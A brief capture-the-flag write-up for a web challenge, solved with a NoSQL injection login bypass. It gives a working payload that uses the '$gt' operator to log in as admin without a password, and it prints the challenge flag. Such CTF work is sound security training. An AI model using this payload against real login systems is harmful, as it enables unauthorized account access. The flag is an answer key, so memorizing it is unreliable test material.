# nosqlforyou | GamingChair

- Description: My friend created an admin account for me but he didnt give me the creds yet... can you help me?

remote:http://167.99.154.216:42067/

# Write up

The vulnerability here is nosqli. Change payload by editing request in burp. One of the possible payloads {"username":"admin","password":{"$gt":""}}

# Flag - n00bz{n0sq1i_i5_1nt3re5t1ng}